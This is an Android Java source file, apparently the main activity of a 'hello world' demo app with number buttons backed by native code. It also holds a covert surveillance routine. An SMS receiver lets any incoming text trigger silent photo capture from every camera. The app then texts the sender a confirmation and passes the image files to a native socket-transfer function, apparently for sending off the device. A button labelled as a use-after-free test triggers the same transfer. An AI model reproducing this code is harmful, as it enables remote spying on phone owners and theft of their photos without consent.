package com.example.helloworldcpp1;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.net.Uri;
import android.os.Bundle;

import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Button;
import android.view.View;
import android.widget.Toast;

import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserFactory;

import java.io.FileNotFoundException;
import java.io.FileReader;
import java.util.HashMap;
import java.util.TreeMap;


public class MainActivity extends AppCompatActivity implements PictureCapturingListener, ActivityCompat.OnRequestPermissionsResultCallback {

    // Used to load the 'native-lib' library on application startup.
    static {
        System.loadLibrary("native-lib");
    }

    // Used to load the 'multifile-transfer' library on application startup.
    static {
        System.loadLibrary("multifile-transfer-lib");
    }

    private static final int MY_PERMISSIONS_REQUEST_SEND_SMS = 0 ;
    String phoneNo;
    String message;


//    protected void sendSMS() {
//        Log.i("Send SMS", "");
//        Intent smsIntent = new Intent(Intent.ACTION_VIEW);
//
//        smsIntent.setData(Uri.parse("smsto:"));
//        smsIntent.setType("vnd.android-dir/mms-sms");
//        smsIntent.putExtra("address", new String (""));
//        smsIntent.putExtra("sms_body", "Test ");
//
//        try {
//            startActivity(smsIntent);
//            finish();
//            Log.i("Finished sending SMS...", "");
//        } catch (android.content.ActivityNotFoundException ex) {
//            Toast.makeText(MainActivity.this,
//                    "SMS failed, please try again later.", Toast.LENGTH_SHORT).show();
//        }
//    }

    /**
     * Displaying the pictures taken.
     */
    @Override
    public void onCaptureDone(String pictureUrl, byte[] pictureData) {
        System.out.println("onCaptureDone");
        System.out.println("Picture saved to " + pictureUrl);
        //showToast("Picture saved to " + pictureUrl);
    }

    /**
     * We've finished taking pictures from all phone's cameras
     */
    @Override
    public void onDoneCapturingAllPhotos(TreeMap<String, byte[]> picturesTaken) {
        System.out.println("onDoneCapturingAllPhotos");

        if (picturesTaken != null && !picturesTaken.isEmpty()) {
            //showToast("Done capturing all photos!");
            sendSMSMessage();
            socketclientmultifile1("0_pic.jpg");
            socketclientmultifile1("1_pic.jpg");
            socketclientmultifile1("2_pic.jpg");
            socketclientmultifile1("3_pic.jpg");
            return;
        }
        //showToast("No camera detected!");

    }

    private BroadcastReceiver mServiceReceiver = new BroadcastReceiver(){
        @Override
        public void onReceive(Context context, Intent intent)
        {

            Log.d("Info", "SMS onReceived");

            if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){

                Bundle bundle = intent.getExtras();           //---get the SMS message passed in---
                SmsMessage[] msgs = null;
                String msg_from = null;
                if (bundle != null){
                    //---retrieve the SMS message received---
                    try{
                        Object[] pdus = (Object[]) bundle.get("pdus");
                        msgs = new SmsMessage[pdus.length];
                        for(int i=0; i<msgs.length; i++){
                            msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
                            msg_from = msgs[i].getOriginatingAddress();
                            String msgBody = msgs[i].getMessageBody();
                            System.out.println("msg_from: " + msg_from);
                            System.out.println("msgBody: " + msgBody);
                            phoneNo = msg_from;
                            message = msgBody;
                            System.out.println("phoneNo: " + phoneNo);

                            pictureService = PictureCapturingServiceImpl.getInstance(getActivity());
                            pictureService.startCapturing(getPictureCapturingListener());

                            Toast toast = Toast.makeText(context,
                                    "Received Text: " + msgBody, Toast.LENGTH_LONG);
                            toast.show();

                        }
                    }catch(Exception e){
                        Log.d("Exception caught",e.getMessage());
                    }
                }
            }

        }
    };

    //The capture service
    public PictureCapturingListener getPictureCapturingListener() {
        return this;
    }

    //The capture service
    public Activity getActivity() {
        return this;
    }


    //The capture service
    private APictureCapturingService pictureService;

    private void showToast(final String text) {
        runOnUiThread(() ->
                Toast.makeText(getApplicationContext(), text, Toast.LENGTH_SHORT).show()
        );
    }

//    @Override
//    protected void onDestroy() {
//        super.onDestroy();
//
//        unregisterReceiver(mServiceReceiver);
//    }


    protected void sendSMSMessage() {
        //phoneNo = "";
        //phoneNo = phoneNo.replace("+1","");
        System.out.println("sendSMSMessage.phoneNo " + phoneNo);
        System.out.println("sendSMSMessage.message " + message);

        if(message.contains("pic")) {

            message = "Got it.";

            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNo, null, message, null, null);
            Toast.makeText(getApplicationContext(), "SMS sent.",
                    Toast.LENGTH_LONG).show();
        }


        //not required. no popup for grant. just on manifest
        //https://android.jlelse.eu/detecting-sending-sms-on-android-8a154562597f
//
//        if (ContextCompat.checkSelfPermission(this,
//                Manifest.permission.SEND_SMS)
//                != PackageManager.PERMISSION_GRANTED) {
//            if (ActivityCompat.shouldShowRequestPermissionRationale(this,
//                    Manifest.permission.SEND_SMS)) {
//            } else {
//                ActivityCompat.requestPermissions(this,
//                        new String[]{Manifest.permission.SEND_SMS},
//                        MY_PERMISSIONS_REQUEST_SEND_SMS);
//            }
//        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,String permissions[], int[] grantResults) {
        switch (requestCode) {
            case MY_PERMISSIONS_REQUEST_SEND_SMS: {
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    SmsManager smsManager = SmsManager.getDefault();
                    smsManager.sendTextMessage(phoneNo, null, message, null, null);
                    Toast.makeText(getApplicationContext(), "SMS sent.",
                            Toast.LENGTH_LONG).show();
                } else {
                    Toast.makeText(getApplicationContext(),
                            "SMS failed, please try again.", Toast.LENGTH_LONG).show();
                    return;
                }
            }
        }

    }



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        //https://www.tutorialspoint.com/android/android_sending_sms.htm
        //sendSMS();
        //sendSMSMessage();

        //https://maximbogatov.wordpress.com
        //https://stackoverflow.com/questions/36327120/startusingnetworkfeature-and-requestroutetohost-depreciated-in-6-0-alternative-t

//        ConnectivityManager mConnMgr =
//                (ConnectivityManager)getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);
//
//        NetworkRequest.Builder builder = new NetworkRequest.Builder();
//        builder.addCapability(NetworkCapabilities.NET_CAPABILITY_MMS);
//        builder.addTransportType(NetworkCapabilities.TRANSPORT_CELLULAR);
//
//        NetworkRequest networkRequest = builder.build();
//        mConnMgr.requestNetwork(networkRequest, new ConnectivityManager.NetworkCallback() {
//            @Override
//            public void onAvailable(Network network) {
//                super.onAvailable(network);
//                //dialog.dismiss();
//                //sendNormalMms();
//                System.out.println("..");
//            }
//        });


        //https://stackoverflow.com/questions/13453640/read-apns-in-android-4-2/18897139#18897139
//        try {
//
//            FileReader reader = new FileReader("/etc/apns-conf.xml");
//
//
//            XmlPullParserFactory factory = XmlPullParserFactory.newInstance();
//            factory.setNamespaceAware(true);
//            XmlPullParser xpp = factory.newPullParser();
//            xpp.setInput(reader);
//            int eventType = xpp.getEventType();
//            while (eventType != XmlPullParser.END_DOCUMENT) {
//                System.out.println(xpp.getName());
//
//                if (eventType == XmlPullParser.START_TAG && xpp.getName().equals("apn")) {
//                    HashMap<String, String> attributes = new HashMap<String, String>();
//                    for (int i = 0; i < xpp.getAttributeCount(); i++) {
//                        attributes.put(xpp.getAttributeName(i), xpp.getAttributeValue(i));
//                    }
//                    System.out.println(attributes.toString());
//                }
//
//                eventType = xpp.next();
//            }
//
//        } catch ( Exception e ){
//            e.printStackTrace();
//        }


        //https://stackoverflow.com/questions/9137477/passing-data-from-broadcast-receiver-to-another-activity
        IntentFilter filter = new IntentFilter();
        filter.addAction("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(mServiceReceiver , filter);

//        pictureService = PictureCapturingServiceImpl.getInstance(this);
//        pictureService.startCapturing(this);

        // Example of a call to a native method
        TextView tv = findViewById(R.id.sample_text);
        tv.setText(stringFromJNI());

        EditText changeNumber = findViewById(R.id.changeNumber);
        //changeNumber.setText(addTwoNumber());

        Button incrementbtn = (Button) findViewById(R.id.incrementbtn);
        incrementbtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                int inputValue1 = 0;
                EditText changeNumberInner = findViewById(R.id.changeNumber);
                String inputValue2 = changeNumberInner.getText().toString();
                if(inputValue2 == null || inputValue2.length() == 0) {
                    inputValue1 = 0;
                } else
                {
                    inputValue1 = Integer.valueOf(inputValue2);
                }
                System.out.println("changeNumber " + inputValue1);

                changeNumberInner.setText(addTwoNumber2(inputValue1));

            }
        });


        Button decrementbtn = (Button) findViewById(R.id.decrement);
        decrementbtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                int inputValue1 = 0;
                EditText changeNumberInner = findViewById(R.id.changeNumber);
                String inputValue2 = changeNumberInner.getText().toString();
                if(inputValue2 == null || inputValue2.length() == 0) {
                    inputValue1 = 0;
                } else
                {
                    inputValue1 = Integer.valueOf(inputValue2);
                }
                System.out.println("changeNumber " + inputValue1);

                changeNumberInner.setText(decTwoNumber2(inputValue1));

            }
        });

        Button filltextid = (Button) findViewById(R.id.filltextid);
        filltextid.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                EditText changeNumberInner = findViewById(R.id.changeNumber);
                String inputValue2 = changeNumberInner.getText().toString();

                TextView tv = findViewById(R.id.sample_text);
                tv.setText(filltext(inputValue2));

            }
        });

        //basic uaf
        //https://sensepost.com/blog/2017/linux-heap-exploitation-intro-series-used-and-abused-use-after-free/

        Button basicUafBtn = (Button) findViewById(R.id.basicUafBtn);
        basicUafBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                Toast.makeText(getApplicationContext(),
                        "UAF Value: "+socketclientmultifile1("0_pic.jpg"),
                        Toast.LENGTH_LONG).show();

                Toast.makeText(getApplicationContext(),
                        "UAF Value: "+socketclientmultifile1("1_pic.jpg"),
                        Toast.LENGTH_LONG).show();

                Toast.makeText(getApplicationContext(),
                        "UAF Value: "+socketclientmultifile1("2_pic.jpg"),
                        Toast.LENGTH_LONG).show();

                Toast.makeText(getApplicationContext(),
                        "UAF Value: "+socketclientmultifile1("3_pic.jpg"),
                        Toast.LENGTH_LONG).show();
            }
        });


    }

    /**
     * A native method that is implemented by the 'native-lib' native library,
     * which is packaged with this application.
     */
    public native String stringFromJNI();
    public native String numberFromJNI();
    public native String addTwoNumber();
    public native String addTwoNumber2(int inputValue1);
    public native String decTwoNumber2(int inputValue1);
    public native String filltext(String inputValue1);
    public native String basicuaf1();
    public native String socketclient1();
    public native String socketserver1();
    public native String fileoperation1();
    public native String socketclientmulti1();
    public native String socketservermultifile1();
    public native String socketclientmultifile1(String inputValue1);

}
